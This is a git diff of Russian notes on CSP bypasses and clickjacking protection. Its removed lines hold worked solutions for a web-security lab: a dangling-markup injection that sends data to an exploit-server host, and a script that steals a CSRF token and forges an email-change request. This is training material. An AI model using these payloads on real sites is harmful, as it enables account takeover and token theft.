@@ -75,11 +75,7 @@ img-src https://images.normal-website.com
 
 Как правило, перезаписать существующую директиву `script-src` невозможно. Однако недавно Chrome представил директиву `script-src-elem`, которая позволяет контролировать элементы `script`, но не события. Критически важно, что эта новая директива позволяет перезаписывать существующие директивы `script-src`. Используя это знание вы можете решить следующую лабораторную работу:
 # Пример Lab: Reflected XSS protected by CSP, with CSP bypass
-находим параметр email 
-```
-x@x"><button formaction="https://exploit-0a9300d9046c306c80c457010174002e.exploit-server.net/exploit" formmethod="get">Click me</button>
-```
- такой пейлоад 
+ 
 
 ---
 # Защита от Clickjacking с помощью CSP
@@ -106,25 +102,3 @@ frame-ancestors 'self' https://normal-website.com https://*.robust-website.com
 Рекомендуется использовать CSP для защиты от Clickjacking. Вы так же можете комбинировать его с заголовком `X-Frame-Optiions`, чтобы обеспечить защиту в старых браузерах, которые не поддерживают CSP, таких как Internet Explorer
 
 
-
-
-```
-123@mail.com"> <button formaction="https://exploit-0a98000c0479731780dd020f019900ac.exploit-server.net/exploit" formmethod="GET">Click me</button> payload
-```
-
-```html
-<script>const querystring = window.location.search;
-const urlParams = new URLSearchParams(querystring);
-const csrftoken = urlParams.get('csrf');
-if (!csrftoken) {
-	window.location = 'https://0a7f005004fc7385801e038100d900ab.web-security-academy.net/my-account?email=%31%32%33%40%6d%61%69%6c%2e%63%6f%6d%22%3e%20%3c%62%75%74%74%6f%6e%20%66%6f%72%6d%61%63%74%69%6f%6e%3d%22%68%74%74%70%73%3a%2f%2f%65%78%70%6c%6f%69%74%2d%30%61%39%38%30%30%30%63%30%34%37%39%37%33%31%37%38%30%64%64%30%32%30%66%30%31%39%39%30%30%61%63%2e%65%78%70%6c%6f%69%74%2d%73%65%72%76%65%72%2e%6e%65%74%2f%65%78%70%6c%6f%69%74%22%20%66%6f%72%6d%6d%65%74%68%6f%64%3d%22%47%45%54%22%3e%43%6c%69%63%6b%20%6d%65%3c%2f%62%75%74%74%6f%6e%3e';
-}
-document.write(
-'<form class="login-form" name="change-email-form" action="https://0a7f005004fc7385801e038100d900ab.web-security-academy.net/my-account/change-email" method="POST">'+
-'<input required="" type="email" name="email" value="pobeda@mail.com">'+
-'<input required="" type="hidden" name="csrf" value="'+csrftoken+'">'+
-'</form>'
-);
-document.forms[0].submit();
-</script>
-```
